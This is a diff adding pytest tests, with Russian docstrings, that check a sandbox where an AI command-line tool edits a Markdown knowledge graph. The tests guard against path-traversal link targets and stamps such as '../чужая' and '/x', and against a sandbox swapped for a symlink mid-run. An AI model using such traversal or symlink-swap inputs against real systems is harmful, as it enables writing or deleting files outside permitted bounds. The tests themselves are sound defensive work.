+    canon.write_text(body, encoding="utf-8")
+    dup = graph / "Ядра" / "Дубль.md"
+    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")
+
+    def worked(pen):
+        (pen / "Ядра" / "Канон.md").write_text(body + "- факт из дубля\n", encoding="utf-8")
+        (pen / "Ядра" / "Дубль.md").write_text(
+            "# Дубль → [[Канон]]\n\nДубль. Смерджен.\n", encoding="utf-8")
+
+    v, _ = _cloud_worked(graph, tmp_path, worked)
+
+    assert "Ядра/Дубль.md" in v.applied, "заглушка на канон рядом отбракована"
+    assert "Ядра/Дубль.md" not in v.reverted
+    assert dup.read_text(encoding="utf-8").startswith("# Дубль → [[")
+
+
+
+def test_a_stub_pointing_outside_the_graph_never_lands(tmp_path):
+    """Заглушка `[[../наружу]]` не применяется, даже если «наружу.md» лежит
+    и за графом, и тёзкой рядом с заглушкой (luna круг-5 И1, DS M3).
+
+    `pathlib.Path(target).name` стирал `..` и каталоги: для корневого дубля
+    локальный кандидат «наружу.md» совпадал с чужим узлом графа, а
+    «../наружу.md» резолвился в файл ЗА границей графа — оба пускали
+    редирект на цель, которой в графе нет. Теперь локальный кандидат —
+    только для bare-имени, а каждый кандидат проходит may_write.
+    """
+    graph = _graph(tmp_path)
+    body = "# Дубль\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
+    dup = graph / "Дубль.md"
+    dup.write_text(body, encoding="utf-8")
+    (graph / "наружу.md").write_text("# Тёзка в графе\n", encoding="utf-8")
+    (graph.parent / "наружу.md").write_text("# За границей графа\n", encoding="utf-8")
+
+    def worked(pen):
+        (pen / "Дубль.md").write_text("# Дубль → [[../наружу]]\n\nСмерджен.\n",
+                                       encoding="utf-8")
+
+    v, _ = _cloud_worked(graph, tmp_path, worked)
+
+    assert "Дубль.md" in v.reverted, "редирект за границу графа применён"
+    assert "Дубль.md" not in v.applied
+    assert dup.read_text(encoding="utf-8") == body, "дубль превращён в заглушку наружу"
+
+
+def test_a_stub_with_a_folder_does_not_settle_for_a_namesake_next_door(tmp_path):
+    """`[[Ядра/Канон]]` с явной папкой не подменяется тёзкой рядом с заглушкой
+    (DS круг-5 M2).
+
+    Фолбэк «канон рядом с заглушкой» строился безусловно: для цели с папкой
+    он давал ДРУГОЙ узел, и когда настоящий канон уехал в карантин
+    (переписан заново), а тёзка рядом цела, заглушка применялась —
+    редирект на неслитый канон.
+    """
+    graph = _graph(tmp_path)
+    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
+    (graph / "Ядра" / "Канон.md").write_text(body, encoding="utf-8")
+    (graph / "Люди").mkdir()
+    dup = graph / "Люди" / "Дубль.md"
+    dup.write_text(body.replace("Ядро", "Дубль"), encoding="utf-8")
+    (graph / "Люди" / "Канон.md").write_text("# Тёзка, не тот узел\n", encoding="utf-8")
+
+    def worked(pen):
+        # канон переписан заново — уйдёт в карантин по retention…
+        (pen / "Ядра" / "Канон.md").write_text("# Ядро\nкороткое резюме\n", encoding="utf-8")
+        # …а заглушка указывает на него с явной папкой
+        (pen / "Люди" / "Дубль.md").write_text(
+            "# Дубль → [[Ядра/Канон]]\n\nСмерджен.\n", encoding="utf-8")
+
+    v, _ = _cloud_worked(graph, tmp_path, worked)
+
+    assert "Ядра/Канон.md" in v.reverted, "канон должен был в карантин"
+    assert "Люди/Дубль.md" in v.reverted, "заглушка встала на тёзку рядом, канон не слит"
+    assert dup.read_text(encoding="utf-8") == body.replace("Ядро", "Дубль")
+
+
+def test_a_sandbox_swapped_mid_run_is_not_transferred(tmp_path, monkeypatch):
+    """Песочницу подменили симлинком на стенограммы, ПОКА CLI работал, —
+    перенос не идёт, стенограммы не становятся «правками облака» (DS круг-5 И1).
+
+    Гард в finally проверял is_dir(), а он идёт ПО симлинку: подмена в окне
+    прогона (до TIMEOUT) проходила гард, и apply_from_copy обходил цель
+    ссылки как песочницу — файлы встречи легли бы в граф узлами облака.
+    Повтор того же штампа после подмены снова правит граф: backup_graph
+    снимает ссылку на месте своего снимка, а не падает в «не удаляется».
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+
+    class Result:
+        returncode = 0
+    def swap_run(cmd, **kwargs):
+        pen = pathlib.Path(kwargs["cwd"])
+        import shutil as _sh
+        _sh.rmtree(pen)
+        pen.symlink_to(transcript.parent)      # подмена во время прогона
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+    def quiet_run(cmd, **kwargs):
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+
+    monkeypatch.setattr(cloud_review.subprocess, "run", swap_run)
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
+                        lambda g: pathlib.Path(g).is_dir())
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    code = cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+
+    text = log.read_text(encoding="utf-8")
+    assert "СНИМОК ИЛИ ПЕСОЧНИЦА ИСЧЕЗЛИ" in text, "подмена прошла гард finally"
+    assert "перенесено в граф" not in text
+    assert not (graph / f"{stamp}.md").exists(), "стенограмма перенесена в граф узлом облака"
+    assert transcript.read_text(encoding="utf-8") == "текст\n", "стенограмма тронута"
+    assert code == 1, "граф не сверен — код обязан быть ненулевым"
+
+    monkeypatch.setattr(cloud_review.subprocess, "run", quiet_run)
+    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+    assert log.read_text(encoding="utf-8").count("режим правка графа") == 2, (
+        "повтор штампа после подмены не вернулся к правке графа"
+    )
+
+
+def test_a_sandbox_swapped_before_launch_leaves_no_orphans_and_frees_the_stamp(tmp_path, monkeypatch):
+    """Подмена песочницы перед стартом: команда собирается ПОСЛЕ проверки,
+    свои снимок и ссылка убраны, повтор штампа снова правит граф.
+
+    luna круг-5 (Critical + И2): проверка стояла после сборки промпта и
+    команды — при отказе CLI получал бы Edit при cwd=настоящий граф; а
+    ссылка оставалась в backup_root, и повтор штампа падал в «старый снимок
+    не удаляется». DS M4: полный снимок лежал сиротой до чужой ротации.
+    """
+    stamp = "2026-07-15_1400"
+    graph = _graph(tmp_path)
+    transcript, rev, log = _meeting(tmp_path)
+    seen = {}
+
+    real_ctx = cloud_review.graph_updater.cloud_enrich_context
+    def swap_then_context(folder, stem):
+        # окно между созданием песочницы и стартом CLI: подмена ссылкой
+        pen = cloud_review.backup_root(graph) / f"{stamp}-облако"
+        if pen.is_dir() and not pen.is_symlink():
+            import shutil as _sh
+            _sh.rmtree(pen)
+            pen.symlink_to(transcript.parent)
+        return real_ctx(folder, stem)
+
+    class Result:
+        returncode = 0
+    def fake_run(cmd, **kwargs):
+        seen["cwd"] = kwargs["cwd"]; seen["cmd"] = " ".join(cmd)
+        kwargs["stdout"].write(_REPORT)
+        return Result()
+
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_enrich_context", swap_then_context)
+    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available",
+                        lambda g: pathlib.Path(g).is_dir())
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+
+    assert "Edit(/**)" not in seen["cmd"], (
+        "команда собрана ДО проверки песочницы — Edit при cwd=настоящий граф"
+    )
+    assert pathlib.Path(seen["cwd"]).resolve() != transcript.parent.resolve()
+    root = cloud_review.backup_root(graph)
+    assert not (root / f"{stamp}-облако").is_symlink(), "ссылка-подмена оставлена в backup_root"
+    assert not (root / stamp).exists(), "полный снимок лежит сиротой (DS M4)"
+    assert "режим правка графа" not in log.read_text(encoding="utf-8")
+
+    # повтор того же штампа без подмены — снова полноценная правка
+    monkeypatch.setattr(cloud_review.graph_updater, "cloud_enrich_context", real_ctx)
+    cloud_review.run(stamp, transcript, graph, rev, log, cfg)
+    assert "режим правка графа" in log.read_text(encoding="utf-8"), "штамп не освободился"
+
+
+def test_a_stamp_that_is_a_path_never_leaves_the_snapshot_root(tmp_path, monkeypatch):
+    """Штамп ложится в путь снимка и песочницы — `/x`, `../x`, `a/b` не
+    выходят за backup_root (luna круг-6).
+
+    `root / stamp` с абсолютным или относительным путём уводил rmtree и
+    unlink за каталог снимков: чужая ссылка исчезала, а на её месте
+    вырастала копия графа. Теперь штамп обязан быть одним именем
+    каталога — и в backup_graph, и в уборке своих артефактов, и на входе
+    воркера, до замка.
+    """
+    import pytest
+    graph = _graph(tmp_path)
+    target = tmp_path / "цель"; target.mkdir()
+    foreign = tmp_path / "чужая"
+    foreign.symlink_to(target)                      # чужая ссылка вне снимков
+    transcript, rev, log = _meeting(tmp_path)
+
+    for bad in (str(foreign), "../чужая", "a/b", "a\\b", ".", "..", ".скрытый", ""):
+        with pytest.raises(ValueError):
+            cloud_review.backup_graph(graph, bad)
+        with pytest.raises(ValueError):
+            cloud_review._drop_own_snapshots(graph, bad)
+
+    def never_run(cmd, **kwargs):
+        raise AssertionError("CLI запущен с кривым штампом")
+    monkeypatch.setattr(cloud_review.subprocess, "run", never_run)
+    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
+    assert cloud_review.run(str(foreign), transcript, graph, rev, log, cfg) == 1
+    assert cloud_review.run("../чужая", transcript, graph, rev, log, cfg) == 1
+
+    assert foreign.is_symlink() and target.is_dir(), "чужая ссылка или её цель тронуты"
+    assert not (foreign / "Ядра").exists(), "на месте чужой ссылки выросла копия графа"
+    # обычный штамп по-прежнему даёт снимок внутри backup_root
+    dest = cloud_review.backup_graph(graph, "2026-07-15_1400")
+    assert dest.parent == cloud_review.backup_root(graph) and dest.is_dir()
